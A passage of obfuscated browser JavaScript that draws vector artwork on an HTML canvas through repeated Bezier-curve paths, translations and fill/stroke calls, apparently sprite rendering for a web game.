			Δ.bezierCurveTo(27 * ᐃ, ᐃ * 65, 32 * ᐃ, 64 * ᐃ, ᐃ * 35, 62 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠᐃΔΔ], Ⲇᐃ[ΔⲆΔΔ], ⵠΔΔᐃΔ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠⲆᐃᐃ];
			Δ.moveTo(ᐃ * 46, 50 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 51, 35 * ᐃ, 70 * ᐃ, 32 * ᐃ, ᐃ * 78, 29 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 84, ᐃ * 27, ᐃ * 113, 36 * ᐃ, 127 * ᐃ, ᐃ * 41);
			Δ.bezierCurveTo(140 * ᐃ, ᐃ * 47, ᐃ * 147, ᐃ * 69, ᐃ * 137, ᐃ * 73);
			Δ.bezierCurveTo(ᐃ * 124, 92 * ᐃ, ᐃ * 117, ᐃ * 92, ᐃ * 109, 94 * ᐃ);
			Δ.bezierCurveTo(101 * ᐃ, 96 * ᐃ, ᐃ * 89, ᐃ * 92, ᐃ * 65, 83 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 54, ᐃ * 80, 46 * ᐃ, 58 * ᐃ, 46 * ᐃ, 51 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[4], Ⲇᐃ[ⵠⵠᐃⵠ], 4 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠᐃΔⵠ];
			Δ.moveTo(ᐃ * 51, ᐃ * 40);
			Δ.bezierCurveTo(ᐃ * 49, 34 * ᐃ, 49 * ᐃ, ᐃ * 34, ᐃ * 47, 28 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 38, 28 * ᐃ, 34 * ᐃ, 27 * ᐃ, 37 * ᐃ, 37 * ᐃ);
			Δ.bezierCurveTo(43 * ᐃ, 40.5 * ᐃ, ᐃ * 43, 40.5 * ᐃ, 49 * ᐃ, ᐃ * 44);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃᐃᐃⵠᐃ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ᐃⲆⵠⵠ];
			Δ.moveTo(29 * ᐃ, ᐃ * 48);
			Δ.bezierCurveTo(ᐃ * 38, ᐃ * 49, 38 * ᐃ, ᐃ * 49, 47 * ᐃ, ᐃ * 50);
			Δ.bezierCurveTo(ᐃ * 46.5, ᐃ * 51.5, ᐃ * 46.5, ᐃ * 51.5, ᐃ * 46, ᐃ * 53);
			Δ.bezierCurveTo(40 * ᐃ, 53.5 * ᐃ, ᐃ * 40, ᐃ * 53.5, ᐃ * 34, 54 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 29, 51 * ᐃ, ᐃ * 32, 51.5 * ᐃ, 30 * ᐃ, 49 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[7]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔΔᐃⲆ];
			Δ.lineJoin = ⵠ[ⲆⲆΔⵠ];
			Δ.moveTo(ᐃ * 89, 61 * ᐃ);
			Δ.bezierCurveTo(101 * ᐃ, ᐃ * 70, ᐃ * 109, 90 * ᐃ, ᐃ * 102, ᐃ * 90);
			Δ.bezierCurveTo(ᐃ * 97, 91 * ᐃ, ᐃ * 87, 91 * ᐃ, ᐃ * 60, ᐃ * 80);
			Δ.bezierCurveTo(ᐃ * 48, ᐃ * 65, 46 * ᐃ, 56 * ᐃ, 48 * ᐃ, ᐃ * 53);
			Δ.bezierCurveTo(ᐃ * 50, ᐃ * 52, 66 * ᐃ, ᐃ * 56, ᐃ * 89, 61 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃΔⲆΔᐃ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⲆΔΔᐃ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 99, 59 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 115, 45 * ᐃ, 125 * ᐃ, ᐃ * 42, 129 * ᐃ, ᐃ * 47);
			Δ.bezierCurveTo(138 * ᐃ, 56 * ᐃ, 140 * ᐃ, ᐃ * 63, ᐃ * 138, 67 * ᐃ);
			Δ.bezierCurveTo(131 * ᐃ, 80 * ᐃ, 122 * ᐃ, ᐃ * 87, ᐃ * 114, 90 * ᐃ);
			Δ.bezierCurveTo(105 * ᐃ, ᐃ * 80, 95 * ᐃ, 62 * ᐃ, 98 * ᐃ, 61 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔⲆΔᐃᐃ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 118, ᐃ * 62);
			Δ.bezierCurveTo(139 * ᐃ, ᐃ * 45, ᐃ * 153, ᐃ * 40, ᐃ * 150, 48 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 145, ᐃ * 57, 157 * ᐃ, ᐃ * 63, 157 * ᐃ, 70 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 157, ᐃ * 74, ᐃ * 142, 77 * ᐃ, ᐃ * 142, 85 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 143, ᐃ * 91, ᐃ * 141, 92 * ᐃ, 135 * ᐃ, 90 * ᐃ);
			Δ.bezierCurveTo(132 * ᐃ, ᐃ * 90, ᐃ * 132, 96 * ᐃ, 124 * ᐃ, 99 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 118, 93 * ᐃ, ᐃ * 116, ᐃ * 77, 116 * ᐃ, ᐃ * 64);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[4], Ⲇᐃ[ᐃΔΔⲆ], ⲆⵠᐃΔ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 90, ᐃ * 130);
			Δ.bezierCurveTo(ᐃ * 157, ᐃ * 115, ᐃ * 165, ᐃ * 111, ᐃ * 167, ᐃ * 115);
			Δ.bezierCurveTo(170 * ᐃ, ᐃ * 117, ᐃ * 171, 135 * ᐃ, ᐃ * 167, 141 * ᐃ);
			Δ.bezierCurveTo(135.5 * ᐃ, ᐃ * 149.5, 135.5 * ᐃ, ᐃ * 149.5, ᐃ * 104, ᐃ * 158);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[8]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠⵠᐃⵠ];
			Δ.moveTo(ᐃ * 53, 119 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 46, ᐃ * 120, ᐃ * 40, 118 * ᐃ, ᐃ * 34, 116 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 28, 111 * ᐃ, 41 * ᐃ, 112 * ᐃ, 39 * ᐃ, 108 * ᐃ);
			Δ.bezierCurveTo(36 * ᐃ, ᐃ * 100, 49 * ᐃ, 102 * ᐃ, ᐃ * 53, 95 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 57, 84 * ᐃ, 58 * ᐃ, 85 * ᐃ, 63 * ᐃ, 93 * ᐃ);
			Δ.bezierCurveTo(68 * ᐃ, ᐃ * 96, ᐃ * 72, ᐃ * 94, 80 * ᐃ, ᐃ * 88);
			Δ.bezierCurveTo(80 * ᐃ, ᐃ * 96, ᐃ * 78, ᐃ * 107, ᐃ * 66, ᐃ * 115);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠⲆΔⵠⵠ], Ⲇᐃ[ⲆⵠΔΔᐃ], 4 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(118 * ᐃ, 64 * ᐃ);
			Δ.bezierCurveTo(133.5 * ᐃ, 57 * ᐃ, 133.5 * ᐃ, ᐃ * 57, ᐃ * 149, ᐃ * 50);
			Δ.bezierCurveTo(145 * ᐃ, ᐃ * 54, ᐃ * 154, ᐃ * 65, ᐃ * 157, ᐃ * 68);
			Δ.bezierCurveTo(ᐃ * 138.5, 66.5 * ᐃ, ᐃ * 138.5, 66.5 * ᐃ, ᐃ * 120, ᐃ * 65);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[8]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃⲆⵠⵠ];
			Δ.lineJoin = ⵠ[ⵠᐃⲆΔ];
			Δ.moveTo(118 * ᐃ, ᐃ * 65);
			Δ.bezierCurveTo(ᐃ * 129, 77 * ᐃ, 129 * ᐃ, ᐃ * 77, ᐃ * 140, 89 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 131, ᐃ * 89, ᐃ * 130, 92 * ᐃ, 128 * ᐃ, 96 * ᐃ);
			Δ.bezierCurveTo(123.5 * ᐃ, 82 * ᐃ, ᐃ * 123.5, ᐃ * 82, ᐃ * 119, ᐃ * 68);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[8]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃᐃⲆᐃ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 51, ᐃ * 112);
			Δ.bezierCurveTo(63 * ᐃ, 108 * ᐃ, 78 * ᐃ, ᐃ * 111, 88 * ᐃ, 112 * ᐃ);
			Δ.bezierCurveTo(98 * ᐃ, 122 * ᐃ, 117 * ᐃ, ᐃ * 136, 125 * ᐃ, 157 * ᐃ);
			Δ.bezierCurveTo(123 * ᐃ, 180 * ᐃ, ᐃ * 123, ᐃ * 185, ᐃ * 118, ᐃ * 186);
			Δ.bezierCurveTo(ᐃ * 101, ᐃ * 190, 89 * ᐃ, 191 * ᐃ, ᐃ * 79, 187 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 53, ᐃ * 165, 50 * ᐃ, 153 * ᐃ, 47 * ᐃ, 144 * ᐃ);
			Δ.bezierCurveTo(46 * ᐃ, 128 * ᐃ, 46 * ᐃ, 124 * ᐃ, ᐃ * 50, ᐃ * 112);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[9], Ⲇᐃ[ⲆⵠⲆⲆᐃ], ᐃ * ⲆⲆⲆΔ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠᐃⵠ];
			Δ.lineJoin = ⵠ[ᐃⲆⵠⵠ];
			Δ.moveTo(50 * ᐃ, ᐃ * 114);
			Δ.bezierCurveTo(81 * ᐃ, 149 * ᐃ, ᐃ * 80, 147 * ᐃ, 80 * ᐃ, 149 * ᐃ);
			Δ.bezierCurveTo(82 * ᐃ, 155 * ᐃ, ᐃ * 80, ᐃ * 182, 74 * ᐃ, ᐃ * 182);
			Δ.bezierCurveTo(60 * ᐃ, ᐃ * 172, 52 * ᐃ, ᐃ * 157, 47 * ᐃ, ᐃ * 144);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[11], Ⲇᐃ[11], ᐃ * ⵠᐃᐃⲆ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⲆⲆΔⵠ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(85 * ᐃ, 152 * ᐃ);
			Δ.bezierCurveTo(99 * ᐃ, 150 * ᐃ, ᐃ * 109, 152 * ᐃ, 119 * ᐃ, 156 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 122, 163 * ᐃ, ᐃ * 122, ᐃ * 174, 117 * ᐃ, ᐃ * 182);
			Δ.closePath();
			Δ.bezierCurveTo(93 * ᐃ, 188 * ᐃ, 82 * ᐃ, ᐃ * 187, ᐃ * 83, 179 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[ⲆⵠΔΔⲆⲆⵠ], Ⲇᐃ[ᐃⵠΔⵠΔΔᐃ], ᐃ * 4);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(104 * ᐃ, 166 * ᐃ);
			Δ.bezierCurveTo(133 * ᐃ, 165 * ᐃ, 142 * ᐃ, 168 * ᐃ, 137 * ᐃ, ᐃ * 173);
			Δ.bezierCurveTo(127 * ᐃ, 177 * ᐃ, ᐃ * 137, ᐃ * 195, 126 * ᐃ, 196 * ᐃ);
			Δ.bezierCurveTo(112 * ᐃ, ᐃ * 195, 112 * ᐃ, ᐃ * 194, ᐃ * 109, ᐃ * 199);
			Δ.bezierCurveTo(ᐃ * 105, ᐃ * 205, 102 * ᐃ, 195 * ᐃ, ᐃ * 96, 197 * ᐃ);
			Δ.bezierCurveTo(84 * ᐃ, 201 * ᐃ, 88 * ᐃ, ᐃ * 198, 90 * ᐃ, ᐃ * 187);
			Δ.bezierCurveTo(96 * ᐃ, ᐃ * 171, 97 * ᐃ, ᐃ * 170, 103 * ᐃ, ᐃ * 167);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[9], Ⲇᐃ[10], 4 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ᐃⲆⵠⵠ];
			Δ.moveTo(ᐃ * 105, 168 * ᐃ);
			Δ.bezierCurveTo(118 * ᐃ, ᐃ * 172.5, 118 * ᐃ, ᐃ * 172.5, 131 * ᐃ, ᐃ * 177);
			Δ.bezierCurveTo(133 * ᐃ, 190 * ᐃ, 132 * ᐃ, 199 * ᐃ, ᐃ * 116, 194 * ᐃ);
			Δ.bezierCurveTo(110 * ᐃ, 182 * ᐃ, 110 * ᐃ, 182 * ᐃ, ᐃ * 104, ᐃ * 170);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔᐃⲆⲆⵠ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃΔΔΔ];
			Δ.lineJoin = ⵠ[ᐃⲆⵠΔ];
			Δ.moveTo(ᐃ * 102, 169 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 100.5, ᐃ * 182, ᐃ * 100.5, 182 * ᐃ, 99 * ᐃ, 195 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 93.5, ᐃ * 196.5, 93.5 * ᐃ, ᐃ * 196.5, ᐃ * 88, 198 * ᐃ);
			Δ.bezierCurveTo(94 * ᐃ, 176 * ᐃ, ᐃ * 96, ᐃ * 174, 101 * ᐃ, ᐃ * 168);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[9], Ⲇᐃ[ⵠΔᐃⲆᐃᐃⲆ], 4 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 64, 107 * ᐃ);
			Δ.bezierCurveTo(64 * ᐃ, 101 * ᐃ, 64 * ᐃ, 101 * ᐃ, ᐃ * 64, ᐃ * 95);
			Δ.bezierCurveTo(57 * ᐃ, 86 * ᐃ, ᐃ * 57, 84 * ᐃ, 53 * ᐃ, 97 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 55, ᐃ * 103.5, 55 * ᐃ, 103.5 * ᐃ, 57 * ᐃ, 110 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[Ⲇᐃᐃᐃᐃ], Ⲇᐃ[11], ᐃ * ΔⲆⲆⲆ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃΔΔⲆ];
			Δ.lineJoin = ⵠ[ΔᐃΔⲆ];
			Δ.moveTo(40 * ᐃ, 108 * ᐃ);
			Δ.bezierCurveTo(46.5 * ᐃ, 111 * ᐃ, ᐃ * 46.5, ᐃ * 111, ᐃ * 53, 114 * ᐃ);
			Δ.bezierCurveTo(50.5 * ᐃ, 117 * ᐃ, 50.5 * ᐃ, ᐃ * 117, 48 * ᐃ, ᐃ * 120);
			Δ.bezierCurveTo(40.5 * ᐃ, ᐃ * 117.5, ᐃ * 40.5, 117.5 * ᐃ, 33 * ᐃ, ᐃ * 115);
			Δ.bezierCurveTo(36 * ᐃ, 112 * ᐃ, ᐃ * 36, 112 * ᐃ, 39 * ᐃ, 109 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[11], Ⲇᐃ[11], ᐃ * ⲆⵠΔⵠ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⲆⵠⵠ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(189 * ᐃ, ᐃ * 106);
			Δ.bezierCurveTo(178.5 * ᐃ, 110.5 * ᐃ, ᐃ * 178.5, 110.5 * ᐃ, ᐃ * 168, 115 * ᐃ);
			Δ.bezierCurveTo(168.5 * ᐃ, ᐃ * 119, ᐃ * 168.5, ᐃ * 119, 169 * ᐃ, ᐃ * 123);
			Δ.bezierCurveTo(179 * ᐃ, ᐃ * 124.5, ᐃ * 179, 124.5 * ᐃ, ᐃ * 189, 126 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 182, ᐃ * 118, ᐃ * 183, 115 * ᐃ, 188 * ᐃ, 106 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃⵠⲆᐃᐃ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃⲆⵠΔ];
			Δ.lineJoin = ⵠ[ᐃΔΔⲆ];
			Δ.moveTo(69 * ᐃ, ᐃ * 178);
			Δ.bezierCurveTo(ᐃ * 69, ᐃ * 141, 70 * ᐃ, ᐃ * 136, 77 * ᐃ, 137 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 88, ᐃ * 133, ᐃ * 101, ᐃ * 134, ᐃ * 108, 137 * ᐃ);
			ΔⲆ(Δ, undefined, Ⲇᐃ[ⵠΔΔΔΔ], ᐃ * ⵠⲆⵠᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠⵠᐃⵠ];
			Δ.moveTo(ᐃ * 55, ᐃ * 161);
			Δ.bezierCurveTo(ᐃ * 54, 124 * ᐃ, ᐃ * 55, 119 * ᐃ, ᐃ * 62, 119 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 74, ᐃ * 117, ᐃ * 85, ᐃ * 117, ᐃ * 93, ᐃ * 119);
			ΔⲆ(Δ, ΔⵠⲆᐃΔ, Ⲇᐃ[ΔΔᐃΔ], ᐃ * 4);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃΔΔⲆ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 91, ᐃ * 29);
			Δ.bezierCurveTo(ᐃ * 74, 33 * ᐃ, ᐃ * 62, ᐃ * 46, 57 * ᐃ, ᐃ * 54);
			Δ.bezierCurveTo(ᐃ * 57, 63 * ᐃ, ᐃ * 68, 76 * ᐃ, ᐃ * 77, 87 * ᐃ);
			ΔⲆ(Δ, ⲆᐃΔⲆᐃ, Ⲇᐃ[6], ᐃ * ⵠΔᐃΔ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠᐃΔⵠ];
			Δ.moveTo(ᐃ * 107, ᐃ * 33);
			Δ.bezierCurveTo(ᐃ * 82, ᐃ * 51, 80 * ᐃ, 52 * ᐃ, 79 * ᐃ, ᐃ * 59);
			Δ.bezierCurveTo(ᐃ * 78, ᐃ * 65, ᐃ * 93, ᐃ * 86, ᐃ * 101, 93 * ᐃ);
			ΔⲆ(Δ, undefined, Ⲇᐃ[6], 4 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔᐃΔⲆ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 130, 98 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 126.5, ᐃ * 103, ᐃ * 126.5, ᐃ * 103, 123 * ᐃ, 108 * ᐃ);
			Δ.bezierCurveTo(133.5 * ᐃ, ᐃ * 107, 133.5 * ᐃ, ᐃ * 107, 144 * ᐃ, ᐃ * 106);
			Δ.bezierCurveTo(138.5 * ᐃ, 110 * ᐃ, 138.5 * ᐃ, 110 * ᐃ, ᐃ * 133, ᐃ * 114);
			Δ.bezierCurveTo(ᐃ * 142, ᐃ * 114, ᐃ * 142, ᐃ * 114, 151 * ᐃ, 114 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 146.5, ᐃ * 119.5, 146.5 * ᐃ, 119.5 * ᐃ, ᐃ * 142, 125 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 146.5, ᐃ * 127, 146.5 * ᐃ, ᐃ * 127, ᐃ * 151, ᐃ * 129);
			Δ.bezierCurveTo(147.5 * ᐃ, ᐃ * 132, ᐃ * 147.5, ᐃ * 132, ᐃ * 144, 135 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 148, ᐃ * 137, ᐃ * 148, ᐃ * 137, 152 * ᐃ, 139 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 149, ᐃ * 142.5, ᐃ * 149, 142.5 * ᐃ, 146 * ᐃ, 146 * ᐃ);
			ΔⲆ(Δ, undefined, Ⲇᐃ[3], ᐃ * ⵠΔΔᐃΔ);
			return Ⲇⵠ
		}

		function ᐃⵠⲆᐃᐃⲆⵠ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = 321 * ᐃ;
			Ⲇⵠ.height = ᐃ * 284;
			Δ.translate(100 * ᐃ, 30 * ᐃ);
			Δ.translate(ᐃ * 5, ᐃ * ⲆⲆⲆΔᐃ);
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : ⵠΔⲆ;
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⲆΔΔᐃ];
			Δ.moveTo(ᐃ * 58, 33 * ᐃ);
			Δ.bezierCurveTo(81 * ᐃ, ᐃ * 22, ᐃ * 93, 26 * ᐃ, ᐃ * 123, 47 * ᐃ);
			Δ.bezierCurveTo(160 * ᐃ, 73 * ᐃ, 169 * ᐃ, 80 * ᐃ, ᐃ * 191, ᐃ * 99);
			Δ.bezierCurveTo(ᐃ * 202, 107 * ᐃ, ᐃ * 211, ᐃ * 118, 195 * ᐃ, ᐃ * 151);
			Δ.bezierCurveTo(181 * ᐃ, ᐃ * 183, 157 * ᐃ, ᐃ * 192, 129 * ᐃ, 174 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 78, 140 * ᐃ, 68 * ᐃ, 129 * ᐃ, ᐃ * 37, ᐃ * 94);
			Δ.bezierCurveTo(ⲆᐃⲆΔⲆ * ᐃ, 68 * ᐃ, 25 * ᐃ, ᐃ * 52, 56 * ᐃ, ᐃ * 34);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃΔΔ]);
			Δ.globalAlpha = ᐃᐃⵠ;
			Δ.translate(ᐃ * -ⵠⵠΔΔ, ᐃ * -ΔⲆⵠⲆⲆ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 58, ᐃ * 33);
			Δ.bezierCurveTo(81 * ᐃ, 22 * ᐃ, ᐃ * 93, ᐃ * 26, ᐃ * 123, 47 * ᐃ);
			Δ.bezierCurveTo(160 * ᐃ, 73 * ᐃ, ᐃ * 169, ᐃ * 80, ᐃ * 191, 99 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 202, ᐃ * 107, 211 * ᐃ, 118 * ᐃ, ᐃ * 195, 151 * ᐃ);
			Δ.bezierCurveTo(181 * ᐃ, ᐃ * 183, 157 * ᐃ, ᐃ * 192, ᐃ * 129, ᐃ * 174);
			Δ.bezierCurveTo(78 * ᐃ, 140 * ᐃ, ᐃ * 68, ᐃ * 129, 37 * ᐃ, ᐃ * 94);
			Δ.bezierCurveTo(ⵠⵠΔⵠᐃ * ᐃ, 68 * ᐃ, ᐃ * 25, ᐃ * 52, 56 * ᐃ, ᐃ * 34);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[ⵠⵠΔⲆ], ᐃ * 10);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(167 * ᐃ, ᐃ * 120);
			Δ.bezierCurveTo(196 * ᐃ, 106 * ᐃ, ᐃ * 207, ᐃ * 111, ᐃ * 199, 135 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 185, ᐃ * 172, ᐃ * 166, ᐃ * 187, 145 * ᐃ, ᐃ * 179);
			Δ.bezierCurveTo(ᐃ * 118, 166 * ᐃ, ᐃ * 127, 139 * ᐃ, ᐃ * 166, 121 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⲆΔⵠⵠ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⲆΔⲆᐃ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(25 * ᐃ, 64 * ᐃ);
			Δ.bezierCurveTo(59 * ᐃ, ᐃ * 96, 97 * ᐃ, 128 * ᐃ, ᐃ * 129, 151 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 126, 163 * ᐃ, 134 * ᐃ, ᐃ * 174, ᐃ * 142, 180 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 114, ᐃ * 170, ᐃ * 68, 134 * ᐃ, ᐃ * 31, ᐃ * 85);
			Δ.bezierCurveTo(ᐃ * 24, ᐃ * 71, ᐃ * 24, ᐃ * 70, ᐃ * 25, ᐃ * 65);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[Ⲇⵠⵠᐃ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠΔⵠ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(161 * ᐃ, 141 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 181, 131 * ᐃ, 186 * ᐃ, 135 * ᐃ, 173 * ᐃ, 152 * ᐃ);
			Δ.bezierCurveTo(163 * ᐃ, ᐃ * 163, 155 * ᐃ, 161 * ᐃ, ᐃ * 151, ᐃ * 150);
			Δ.bezierCurveTo(ᐃ * 147, 140 * ᐃ, 155 * ᐃ, ᐃ * 131, 175 * ᐃ, ᐃ * 125);
			Δ.bezierCurveTo(ᐃ * 190, 120 * ᐃ, 196 * ᐃ, ᐃ * 121, ᐃ * 189, ᐃ * 143);
			Δ.bezierCurveTo(182 * ᐃ, 167 * ᐃ, ᐃ * 169, 174 * ᐃ, 157 * ᐃ, ᐃ * 174);
			Δ.bezierCurveTo(ᐃ * 138, ᐃ * 172, ᐃ * 139, ᐃ * 162, ᐃ * 140, 156 * ᐃ);
			ΔⲆ(Δ, ᐃⲆᐃⲆⲆ, Ⲇᐃ[ⲆⲆⲆΔ], 4 * ᐃ);
			Δ.translate(-100 * ᐃ, -30 * ᐃ);
			Δ.translate(ⲆⵠⲆⲆᐃ * ᐃ, ᐃ * 70);
			Δ.translate(ᐃ * ⵠⵠΔΔ, ᐃ * 10);
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : ⵠΔⲆ;
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 58, 33 * ᐃ);
			Δ.bezierCurveTo(81 * ᐃ, 22 * ᐃ, ᐃ * 93, 26 * ᐃ, 123 * ᐃ, ᐃ * 47);
			Δ.bezierCurveTo(ᐃ * 160, ᐃ * 73, ᐃ * 169, 80 * ᐃ, 191 * ᐃ, 99 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 202, ᐃ * 107, ᐃ * 211, ᐃ * 118, ᐃ * 195, ᐃ * 151);
			Δ.bezierCurveTo(ᐃ * 181, 183 * ᐃ, ᐃ * 157, 192 * ᐃ, 129 * ᐃ, ᐃ * 174);
			Δ.bezierCurveTo(ᐃ * 78, 140 * ᐃ, ᐃ * 68, 129 * ᐃ, ᐃ * 37, ᐃ * 94);
			Δ.bezierCurveTo(ᐃ * ⵠᐃⲆΔᐃᐃⲆ, ᐃ * 68, ᐃ * 25, ᐃ * 52, ᐃ * 56, 34 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.globalAlpha = 1;
			Δ.translate(ᐃ * -ⲆΔⲆᐃ, -ⵠⵠⲆΔΔ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔⵠⲆⲆ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 58, 33 * ᐃ);
			Δ.bezierCurveTo(81 * ᐃ, 22 * ᐃ, ᐃ * 93, ᐃ * 26, ᐃ * 123, 47 * ᐃ);
			Δ.bezierCurveTo(160 * ᐃ, ᐃ * 73, ᐃ * 169, 80 * ᐃ, ᐃ * 191, ᐃ * 99);
			Δ.bezierCurveTo(ᐃ * 202, ᐃ * 107, ᐃ * 211, ᐃ * 118, ᐃ * 195, ᐃ * 151);
			Δ.bezierCurveTo(ᐃ * 181, 183 * ᐃ, 157 * ᐃ, ᐃ * 192, 129 * ᐃ, 174 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 78, ᐃ * 140, 68 * ᐃ, 129 * ᐃ, ᐃ * 37, 94 * ᐃ);
			Δ.bezierCurveTo(ΔⲆᐃᐃⲆ * ᐃ, ᐃ * 68, ᐃ * 25, 52 * ᐃ, ᐃ * 56, ᐃ * 34);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔⵠΔⵠ], Ⲇᐃ[2], ᐃ * 10);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
